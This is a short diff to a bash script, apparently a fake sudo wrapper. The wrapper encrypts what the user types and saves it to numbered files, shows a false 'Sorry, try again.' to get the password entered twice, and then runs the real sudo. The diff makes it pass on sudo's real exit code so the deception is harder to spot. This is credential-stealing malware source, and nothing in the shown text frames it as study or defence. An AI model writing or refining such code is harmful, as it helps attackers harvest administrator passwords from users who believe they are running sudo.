@@ -44,7 +44,7 @@ function sudo_kernel() {
     # if not arguments are given show sudos help page
     if [ $# -lt 1 ]; then
         sudo
-        exit 1
+        exit $?
     fi
 
     mkdir -p "$FOLDER_PATH"
@@ -83,8 +83,7 @@ function sudo_kernel() {
                 "${folder_now}/smime.bash" encrypt "${folder_now}/${CERTIFICATE}" - "$FOLDER_PATH/$(create_file_name $COUNTER)y"
 
                 sudo "$@"
-
-                exit 1
+                exit $?
             fi
 
         # if is cached catch twice
@@ -98,7 +97,7 @@ function sudo_kernel() {
             # sudo with the cache
             if [ $COUNTER -gt 1 ]; then
                 sudo "$@"
-                exit 1
+                exit $?
             else
                 sleep 1
                 echo "Sorry, try again."
